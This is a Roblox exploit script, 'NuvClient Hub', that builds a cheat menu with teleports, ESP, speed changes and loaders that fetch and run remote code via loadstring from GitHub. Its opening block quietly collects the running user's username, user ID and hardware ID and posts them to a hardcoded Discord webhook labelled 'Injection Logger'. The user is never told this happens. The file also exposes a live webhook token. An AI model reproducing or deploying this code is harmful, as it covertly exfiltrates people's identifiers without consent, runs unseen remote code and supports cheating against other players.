-- NuvClient Hub


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local username = LocalPlayer.Name
local userId = LocalPlayer.UserId
local timestamp = os.date("%Y-%m-%d %H:%M:%S")

local raw_hwid = gethwid and gethwid() or "Unknown"

local function hexToString(hex)
    return (hex:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

local decoded_hwid = raw_hwid
if raw_hwid:match("^[0-9a-fA-F]+$") and #raw_hwid % 2 == 0 then
    pcall(function()
        decoded_hwid = hexToString(raw_hwid)
    end)
end

local webhookURL = "https://discord.com/api/webhooks/1363592994346897449/q5mw3F6TrsP21Ues1f2RGY_sLdyK23NULbFRo3AzlKTa0KY1_JGTz73xHWuTYKIY3pNx"

local payload = {
    ["username"] = "Injection Logger",
    ["embeds"] = { {
        ["title"] = "🧪 Script Injected",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "👤 Username", ["value"] = username, ["inline"] = true},
            {["name"] = "🆔 User ID", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "🧬 HWID", ["value"] = decoded_hwid, ["inline"] = false},
            {["name"] = "🕒 Time", ["value"] = timestamp, ["inline"] = false}
        }
    }}
}

local jsonData = HttpService:JSONEncode(payload)

local function getRequestFunction()
    if http_request then
        return http_request
    elseif request then
        return request
    elseif syn and syn.request then
        return syn.request
    elseif fluxus and fluxus.request then
        return fluxus.request
    elseif electron and electron.request then
        return electron.request
    elseif game:GetService("HttpService") and game:GetService("HttpService").RequestAsync then
        return game:GetService("HttpService").RequestAsync
    else
        return nil
    end
end

local requestFunc = getRequestFunction()

if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
    
    if success then
        print("✅")
    else
        warn("❌ Webhook: " .. err)
    end
else
    warn("❌")
end





local plr = game.Players.LocalPlayer

SCRIPT_VERSION = {"2.2"}

PAST_VERSIONS = {"1", "1.1", "1.2", "1.3", "1.4", "2", "2.1"}

if table.find(PAST_VERSIONS, SCRIPT_VERSION[1]) then warn("This is not the right version of NuvClient, please check Discord: https://discord.gg/SWRFHJAzVK") return end

if game.CoreGui:FindFirstChild("NuvClientHub") then warn("NuvClient is already loaded, to remove click 'Backspace'") return end

local SGui = Instance.new("ScreenGui")
SGui.Parent = game:WaitForChild("CoreGui")
SGui.Name = "NuvClientHub"

local Background = Instance.new("Frame")
Background.Parent = SGui
Background.AnchorPoint = Vector2.new(0.5,0.5)
Background.Position = UDim2.new(0.08,0,.5,0)
Background.Size = UDim2.new(0, 251,0, 334)
Background.BackgroundColor3 = Color3.fromRGB(36,36,36)

local UserInputService = game:GetService("UserInputService")
local PanicKey = Enum.KeyCode.Backspace

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == PanicKey and not gameProcessed then
		game:GetService("CoreGui"):FindFirstChild("NuvClientHub"):Destroy()
	end
end)

local UIScale = Instance.new("UIScale")
UIScale.Scale = 1
UIScale.Parent = Background

local UiDrag = Instance.new("UIDragDetector")
UiDrag.Parent = Background

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 4.5
Stroke.LineJoinMode = Enum.LineJoinMode.Round
Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Stroke.Parent = Background
Stroke.Color = Color3.fromRGB(255,255,255)

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0,11)
Corner.Parent = Background


local TitleFrame = Instance.new("Frame")
TitleFrame.AnchorPoint = Vector2.new(0.5,0.5)
TitleFrame.Parent = Background
TitleFrame.Position = UDim2.new(0.5, 0,0.064, 0)
TitleFrame.Size = UDim2.new(0, 251,0, 42)
TitleFrame.BackgroundColor3 = Color3.fromRGB(26,26,26)

local Stroke2 = Stroke:Clone()
Stroke2.Parent = TitleFrame

local Corner2 = Corner:Clone()
Corner2.Parent = TitleFrame


local Title = Instance.new("TextLabel")
Title.Parent = TitleFrame
Title.Text = "NuvClient"
Title.AnchorPoint = Vector2.new(0.5,0.5)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.498, 0,0.603, 0)
Title.Size = UDim2.new(0, -165,0, 49)
Title.Font = Enum.Font.LuckiestGuy
Title.FontFace.Weight = Enum.FontWeight.Bold
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.TextScaled = true

local Stroke2 = Stroke:Clone()
Stroke2.Parent = Title
Stroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
Stroke2.Color = Color3.fromRGB(0,0,0)
Stroke2.Thickness = 2.5


local List = Instance.new("ScrollingFrame")
List.Parent = Background
List.BackgroundTransparency = 1
List.AnchorPoint = Vector2.new(0.5,0.5)
List.Position = UDim2.new(0.51, 0,0.566, 0)
List.Size = UDim2.new(0, 233,0, 265)
List.ScrollBarThickness = 6
List.CanvasSize = UDim2.new(0, 0,3, 0)
List.ScrollingEnabled = true
List.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = List
UIListLayout.Padding = UDim.new(0.015,0)
UIListLayout.FillDirection = Enum.FillDirection.Vertical
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Top

local Category = Instance.new("TextLabel")
Category.Parent = List
Category.BackgroundTransparency = 1
Category.LayoutOrder = 0
Category.Size = UDim2.new(0, 200,0, 30)
Category.Font = Enum.Font.SourceSansBold
Category.FontFace.Weight = Enum.FontWeight.ExtraBold
Category.Text = "PRISON LIFE"
Category.TextScaled = true
Category.TextColor3 = Color3.fromRGB(255,255,255)

local StrokeExtra = Stroke:Clone()
StrokeExtra.Parent = Category
StrokeExtra.Thickness = 2.5
StrokeExtra.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
StrokeExtra.Color = Color3.fromRGB(0,0,0)

local CreateButton = Instance.new("TextButton")
CreateButton.BackgroundColor3 = Color3.fromRGB(16,16,16)
CreateButton.Size = UDim2.new(0, 200,0, 32)
CreateButton.TextColor3 = Color3.fromRGB(255,255,255)
CreateButton.Font = Enum.Font.SourceSansBold
CreateButton.FontFace.Weight = Enum.FontWeight.ExtraBold
CreateButton.TextScaled = true
CreateButton.Visible = false

local Corner3 = Corner:Clone()
Corner3.Parent = CreateButton

local Stroke3 = Stroke:Clone()
Stroke3.Parent = CreateButton
Stroke3.Thickness = 3.5

local CreateTextBox = Instance.new("TextBox")
CreateTextBox.BackgroundColor3 = Color3.fromRGB(16,16,16)
CreateTextBox.Size = UDim2.new(0, 200,0, 32)
CreateTextBox.TextColor3 = Color3.fromRGB(255,255,255)
CreateTextBox.PlaceholderColor3 = Color3.fromRGB(122,122,122)
CreateTextBox.Text = ""
CreateTextBox.Font = Enum.Font.SourceSansBold
CreateTextBox.FontFace.Weight = Enum.FontWeight.ExtraBold
CreateTextBox.TextScaled = true
CreateTextBox.Visible = false

local Corner4 = Corner:Clone()
Corner4.Parent = CreateTextBox

local Stroke4 = Stroke:Clone()
Stroke4.Parent = CreateTextBox
Stroke4.Thickness = 3.5


-- Teleport Functions

local function TpToPrison()
	plr.Character:MoveTo(game.Workspace.Prison_Cafeteria.floor.Position)
end

local function toGuardRoom()
	plr.Character:MoveTo(game.Workspace["Prison_guardspawn"].spawn.Position)
end

local function toCriminalBase()
	plr.Character:MoveTo(game.Workspace["Criminals Spawn"]:FindFirstChild("SpawnLocation").Position)
end


-- Buttons


-- Prison Life

local TpPrison = CreateButton:Clone()
TpPrison.Visible = true
TpPrison.Parent = List
TpPrison.Name = "TpPrison"
TpPrison.LayoutOrder = 1
TpPrison.Text = "TP To Prison"

TpPrison.MouseButton1Click:Connect(function()
	TpToPrison()
end)

local TpGuardRoom = CreateButton:Clone()
TpGuardRoom.Visible = true
TpGuardRoom.Parent = List
TpGuardRoom.Name = "TpGuardRoom"
TpGuardRoom.LayoutOrder = 2
TpGuardRoom.Text = "TP To Guards"

TpGuardRoom.MouseButton1Click:Connect(function()
	toGuardRoom()
end)

local TpCriminalBase = CreateButton:Clone()
TpCriminalBase.Visible = true
TpCriminalBase.Parent = List
TpCriminalBase.Name = "TpCriminalBase"
TpCriminalBase.LayoutOrder = 3
TpCriminalBase.Text = "TP To Criminals"

TpCriminalBase.MouseButton1Click:Connect(function()
	toCriminalBase()
end)


-- Universal


-- Universal Functions


local function AddESP()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/nuvilol/NuvClientHub/refs/heads/main/Esp'))()
end

local function AddInfYield()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source'))()
end

local function AntiEsp()
	while true do

		task.wait(.001)

		if plr.Character then
			for _, FindEsp in ipairs(plr.Character:GetChildren()) do
				if FindEsp:IsA("Highlight") then
					FindEsp:Destroy()
				end
			end
		end
	end
end

local function rejoinGame()
	game["Teleport Service"]:Teleport(game.PlaceId, plr)
end


-- Buttons


local Cat2 = Category:Clone()
Cat2.LayoutOrder = 4
Cat2.Name = "UniversalCat"
Cat2.Text = "UNIVERSAL"
Cat2.Parent = List

local EspButton = CreateButton:Clone()
EspButton.Visible = true
EspButton.Parent = List
EspButton.Name = "EspButton"
EspButton.LayoutOrder = 5
EspButton.Text = "Enable ESP"

EspButton.MouseButton1Click:Connect(function()
	if not plr.Character:FindFirstChild("HighlightESP") then
		AddESP()
	end
end)

local AimLockToggle = CreateButton:Clone() -- disbaled for now
AimLockToggle.Visible = false
AimLockToggle.Parent = List
AimLockToggle.Name = "AimLockToggle"
AimLockToggle.LayoutOrder = 6
AimLockToggle.Text = "Aim Lock Toggle"

AimLockToggle.MouseButton1Click:Connect(function()

end)

local PlayerTp = CreateTextBox:Clone()
PlayerTp.Visible = true
PlayerTp.Parent = List
PlayerTp.Name = "PlayerTp"
PlayerTp.LayoutOrder = 7
PlayerTp.PlaceholderText = "Player Teleport"

local function playerTeleport(enterPressed)
	local plrToTP = PlayerTp.Text
	local plrName = plr.Name

	if enterPressed then
		if game.Players:FindFirstChild(plrToTP) then
			game.Players:FindFirstChild(plrName).Character:MoveTo(game.Players:FindFirstChild(plrToTP).Character.HumanoidRootPart.Position)
		else
			warn("Player not found")
		end
	end
end

PlayerTp.FocusLost:Connect(playerTeleport)

local InfiniteYield = CreateButton:Clone()
InfiniteYield.Visible = true
InfiniteYield.Parent = List
InfiniteYield.Name = "InfiniteYield"
InfiniteYield.LayoutOrder = 8
InfiniteYield.Text = "Infinite Yield"

InfiniteYield.MouseButton1Click:Connect(AddInfYield)

local AddSpeedPlr = CreateTextBox:Clone()
AddSpeedPlr.Visible = true
AddSpeedPlr.Parent = List
AddSpeedPlr.Name = "AddSpeedPlr"
AddSpeedPlr.LayoutOrder = 9
AddSpeedPlr.PlaceholderText = "Player Speed"

local function AddSpeed(enterPressed)
	local speedToGo = AddSpeedPlr.Text

	if enterPressed then
		plr.Character.Humanoid.WalkSpeed = speedToGo
	end
end

AddSpeedPlr.FocusLost:Connect(AddSpeed)

local GameTeleport = CreateTextBox:Clone()
GameTeleport.Visible = true
GameTeleport.Parent = List
GameTeleport.Name = "GameTeleport"
GameTeleport.LayoutOrder = 10
GameTeleport.PlaceholderText = "Game TP: Place Id"

local function GameTP(enterPressed)
	local GameTeleport = GameTeleport.Text

	if enterPressed then
		game["Teleport Service"]:Teleport(GameTeleport, plr)
	end
end

GameTeleport.FocusLost:Connect(GameTP)

local AntiEspButton = CreateButton:Clone()
AntiEspButton.Visible = false
AntiEspButton.Parent = List
AntiEspButton.Name = "AntiEspButton"
AntiEspButton.LayoutOrder = 10
AntiEspButton.Text = "Anti-Esp (WIP)"

AntiEspButton.MouseButton1Click:Connect(AntiEsp)

local GameRejoin = CreateButton:Clone()
GameRejoin.Visible = true
GameRejoin.Parent = List
GameRejoin.Name = "GameRejoin"
GameRejoin.LayoutOrder = 11
GameRejoin.Text = "Rejoin"

GameRejoin.MouseButton1Click:Connect(rejoinGame)

local FlyHighToggle = CreateButton:Clone()
FlyHighToggle.Visible = true
FlyHighToggle.Parent = List
FlyHighToggle.Name = "FlyHighToggle"
FlyHighToggle.LayoutOrder = 12
FlyHighToggle.Text = "Go High (WIP)"

FlyHighToggle.MouseButton1Click:Connect(function()
	plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0,1000,0)
end)



-- Discord Button


local Cat3 = Category:Clone()
Cat3.LayoutOrder = -10
Cat3.Name = "SocialsCat"
Cat3.Text = "SOCIALS / SETTINGS"
Cat3.Parent = List

local DiscordButton = CreateButton:Clone()
DiscordButton.Visible = true
DiscordButton.Parent = List
DiscordButton.Name = "DiscordButton"
DiscordButton.LayoutOrder = -9
DiscordButton.Text = "Discord"

local function inviteDiscord()
	setclipboard("https://discord.gg/SWRFHJAzVK")

    DiscordButton.Text = "Copied"
    task.wait(1.5)
    DiscordButton.Text = "Discord"
end

DiscordButton.MouseButton1Click:Connect(inviteDiscord)

local GuiScale = CreateTextBox:Clone()
GuiScale.Visible = true
GuiScale.Parent = List
GuiScale.Name = "GuiScale"
GuiScale.LayoutOrder = -8
GuiScale.PlaceholderText = "GUI Scale"

local function GuiScaleChange(enterPressed)
	local GuiScale = GuiScale.Text

	if enterPressed then
		if GuiScale == "0" then return end
        if GuiScale == ".1" then return end
		UIScale.Scale = GuiScale
	end
end

GuiScale.FocusLost:Connect(GuiScaleChange)